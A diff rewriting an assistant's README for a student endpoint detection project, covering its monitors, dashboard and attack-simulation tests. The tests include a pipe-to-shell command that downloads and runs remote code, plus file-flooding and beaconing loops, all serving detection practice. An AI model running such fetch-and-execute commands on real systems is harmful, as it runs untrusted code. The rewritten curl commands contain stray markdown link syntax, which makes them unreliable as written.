@@ -1,291 +1,181 @@
-haan 👍 bilkul — main **ekdum professional, end-to-end README.md** likh raha hoon
-**exact tumhare project ke hisaab se**, with:
+Here is a clean, professionally formatted version of your `README.md`. I have optimized the Markdown syntax, fixed the indentation for the directory tree, and enhanced the visual flow using tables and code blocks.
 
-* 📂 exact project path
-* 🧱 code structure
-* ⚙️ installation
-* ▶️ execution (step-by-step terminals)
-* 🧪 testing commands (including **tumhara curl loop**)
-* 🎥 YouTube demo section
-* 🧠 interview-ready language
-
-Tum bas **copy–paste** kar dena `README.md` me.
+You can copy and paste the content below directly into your file.
 
 ---
-
-cd monitored_dir
-for i in {1..30}; do echo "encrypt" >> file$i.txt; done
-
-
-# ✅ **FINAL PROFESSIONAL `README.md`**
 
 ```markdown
 # 🛡️ Mini-EDR – Endpoint Detection & Response System
 
-Mini-EDR is a **behavior-based Endpoint Detection & Response (EDR)** system built using Python.
-It monitors **process activity, file system behavior, and network traffic** to detect:
+Mini-EDR is a **behavior-based Endpoint Detection & Response (EDR)** system built using Python. It monitors **process activity, file system behavior, and network traffic** to detect modern attack patterns in real-time.
 
-- Suspicious script execution
-- Ransomware-like mass file modification
-- Possible C2 (Command & Control) network beaconing
+- **Suspicious script execution** (e.g., pipe-to-shell)
+- **Ransomware-like behavior** (mass file modifications)
+- **Possible C2 (Command & Control)** network beaconing
 
-The project also includes a **SOC-style web dashboard** to visualize security alerts.
-
----
-
-## 📂 Project Location
-
-```
-
-/home/baby/pro1/mini-edr
-
-```
+The project also includes a **SOC-style web dashboard** to visualize security alerts for incident response.
 
 ---
 
 ## 🧱 Project Structure
 
-```
-
+```text
 mini-edr/
 ├── agent/
-│   ├── process_monitor.py      # Detects malicious process behavior
-│   ├── file_monitor.py         # Detects ransomware-style file activity
-│   ├── network_monitor.py      # Detects C2-like network beaconing
-│
+│   ├── process_monitor.py  # Detects malicious process behavior
+│   ├── file_monitor.py     # Detects ransomware-style file activity
+│   └── network_monitor.py  # Detects C2-like network beaconing
 ├── server/
-│   ├── detector.py              # Central detection & correlation engine
-│   ├── dashboard.py             # SOC-style Flask dashboard
-│
-├── monitored_dir/               # Directory used for ransomware testing
+│   ├── detector.py         # Central detection & correlation engine
+│   └── dashboard.py        # SOC-style Flask dashboard
+├── monitored_dir/          # Directory used for ransomware testing
 ├── logs/
-│   └── edr.log                  # Central JSON event log
-│
-├── start_edr.sh                 # Service launcher script
+│   └── edr.log             # Central JSON event log
+├── start_edr.sh            # Service launcher script
 ├── README.md
 ├── .gitignore
-└── venv/                        # Python virtual environment (not pushed to GitHub)
+└── venv/                   # Python virtual environment
 
-````
+```
+
+---
+
+## 🧠 Architecture Overview
+
+```text
+[      Agent Layer      ]
+   ├─ Process Monitor
+   ├─ File Monitor
+   └─ Network Monitor
+           ↓ (JSON Events)
+    [ Central Log: edr.log ]
+           ↓
+    [  Detection Engine    ]
+           ↓ (Alert Correlation)
+    [    SOC Dashboard     ]
+
+```
 
 ---
 
 ## ⚙️ Requirements
 
-- Linux (tested on Debian / Kali / Ubuntu)
-- Python 3.9+
-- Internet access (for network testing)
+* **OS:** Linux (Tested on Debian / Kali / Ubuntu)
+* **Language:** Python 3.9+
+* **Privileges:** Root/Sudo may be required for certain network captures.
 
 ---
 
 ## 🛠️ Installation
 
 ```bash
+# Navigate to project directory
 cd /home/baby/pro1/mini-edr
 
+# Setup Virtual Environment
 python3 -m venv venv
 source venv/bin/activate
 
+# Install Dependencies
 pip install psutil watchdog flask requests
-````
+
+```
 
 ---
 
 ## ▶️ How to Run (Step-by-Step)
 
-### 🔹 Terminal 1 – Process Monitoring
+Open separate terminal tabs for each component (ensure `venv` is active in each):
 
-```bash
-source venv/bin/activate
-python agent/process_monitor.py
-```
+| Component | Command |
+| --- | --- |
+| **1. Process Monitor** | `python agent/process_monitor.py` |
+| **2. File Monitor** | `python agent/file_monitor.py` |
+| **3. Network Monitor** | `python agent/network_monitor.py` |
+| **4. Detection Engine** | `python server/detector.py` |
+| **5. SOC Dashboard** | `python server/dashboard.py` |
 
----
-
-### 🔹 Terminal 2 – File / Ransomware Monitoring
-
-```bash
-source venv/bin/activate
-python agent/file_monitor.py
-```
-
----
-
-### 🔹 Terminal 3 – Network Monitoring
-
-```bash
-source venv/bin/activate
-python agent/network_monitor.py
-```
-
----
-
-### 🔹 Terminal 4 – Detection Engine
-
-```bash
-source venv/bin/activate
-python server/detector.py
-```
-
----
-
-### 🔹 Terminal 5 – SOC Dashboard
-
-```bash
-source venv/bin/activate
-python server/dashboard.py
-```
-
-Open browser:
-
-```
-http://127.0.0.1:5001
-```
+**Access the Dashboard:** Open your browser to [http://127.0.0.1:5001](http://127.0.0.1:5001)
 
 ---
 
 ## 🧪 Testing Scenarios
 
-### 🧨 Ransomware Simulation (Mass File Modification)
+### 🧨 1. Ransomware Simulation (Mass File Modification)
 
 ```bash
 cd monitored_dir
 for i in {1..30}; do echo "encrypt" >> file$i.txt; done
+
 ```
 
-✔ Expected:
+* **Expected Result:** `HIGH` severity alert: "Possible ransomware behavior (mass file modification)".
 
-* **HIGH severity alert**
-* Reason: `Possible ransomware behavior (mass file modification)`
-
----
-
-### 🌐 Network Detection Test (C2-like Behavior)
+### 🌐 2. Network Detection (C2-like Behavior)
 
 ```bash
-for i in {1..10}; do curl http://example.com; done
+for i in {1..10}; do curl [http://example.com](http://example.com); done
+
 ```
 
-✔ Expected:
+* **Expected Result:** Network alert triggered for repeated outbound connections (beaconing).
 
-* Network alert triggered
-* Reason: `Possible C2 beaconing (repeated outbound connections)`
-
----
-
-### 🧪 Process-Based Attack Simulation
+### 🧪 3. Process-Based Attack
 
 ```bash
-bash -c "curl http://example.com | sh"
-```
-
-✔ Expected:
-
-* Process alert
-* Reason: `Script downloading from internet`
-
----
-
-## 🚨 Alert Types
-
-| Type    | Description                    |
-| ------- | ------------------------------ |
-| PROCESS | Suspicious script execution    |
-| FILE    | Ransomware-style file behavior |
-| NETWORK | Possible C2 beaconing          |
-
-Only **high-severity alerts** are shown on the dashboard to reduce noise.
-
----
-
-## 📊 SOC Dashboard
-
-* Clean tabular view
-* Real-time alert updates
-* Only critical events displayed
-* Designed like a SOC analyst console
-
----
-
-## 🎥 Demo Video (YouTube)
-
-📺 **Project Demo:**
-👉 *(Add your YouTube video link here)*
-
-The demo explains:
-
-* Architecture
-* Live attack simulation
-* Dashboard alerts
-* Detection logic
-
----
-
-## 🧠 Architecture Overview
+bash -c "curl [http://example.com](http://example.com) | sh"
 
 ```
-[Agent Layer]
-  ├─ Process Monitor
-  ├─ File Monitor
-  ├─ Network Monitor
-        ↓
-[Central Log: edr.log]
-        ↓
-[Detection Engine]
-        ↓
-[SOC Dashboard]
-```
+
+* **Expected Result:** Process alert: "Script downloading from internet".
 
 ---
 
-## 🔐 Hardening Techniques Used
+## 🚨 Alert Classification
 
-* Alert deduplication
-* Cooldown-based detection
-* Allowlisting to reduce false positives
-* Incident-level alerting
+| Type | Description |
+| --- | --- |
+| **PROCESS** | Suspicious script execution or shell pipes. |
+| **FILE** | Mass file modifications indicating encryption/data wiping. |
+| **NETWORK** | High-frequency outbound traffic to external IPs. |
+
+> **Note:** Only high-severity alerts are forwarded to the dashboard to reduce SOC fatigue and noise.
 
 ---
 
-## ⚠️ Limitations
+## 🎥 Demo Video
 
-* User-space monitoring (no kernel hooks)
-* Designed for learning & demonstration
-* Not a replacement for enterprise EDR
+The demo covers:
+
+* System Architecture.
+* Live attack simulation & automated detection.
+* SOC Dashboard analysis.
+
+---
+
+## 🔐 Hardening & Design
+
+* **Alert Deduplication:** Prevents flooding the dashboard with the same event.
+* **Cooldown Windows:** Groups related events into single incidents.
+* **Allowlisting:** Built-in mechanism to reduce false positives from system processes.
 
 ---
 
 ## 🎯 Use Cases
 
-* Blue Team practice
-* Detection engineering learning
-* SOC analyst portfolio project
-* Interview demonstrations
+* **Blue Team Practice:** Understand how telemetry is gathered and analyzed.
+* **Detection Engineering:** Learn how to write logic that catches malicious patterns.
+* **Portfolio Project:** A tangible demonstration of security engineering skills for interviews.
 
 ---
 
-## 👨‍💻 Author
-
-**Om Niraj**
-Cybersecurity | Blue Team | Detection Engineering
-
----
-
-## ⭐ Note
-
-If you like this project, feel free to ⭐ star the repository!
+*Disclaimer: This is a user-space EDR for educational purposes and is not intended to replace enterprise-grade kernel-level protection.*
 
 ```
 
 ---
 
-# ✅ NEXT OPTIONAL STEPS (YOU CAN CHOOSE)
+### What's next?
+Would you like me to create the **`start_edr.sh`** script for you so you can launch all those components with a single command?
 
-Reply with **one word** 👇  
-- `mock` → full **interview mock (EDR / SOC)**  
-- `linkedin` → LinkedIn post for this project  
-- `resume` → resume bullet points  
-- `advanced` → next-level EDR ideas (eBPF, kernel, SIEM)
-
-Bhai, ye README **industry-level hai** — koi professor / interviewer bhi impressed hoga 💪
 ```
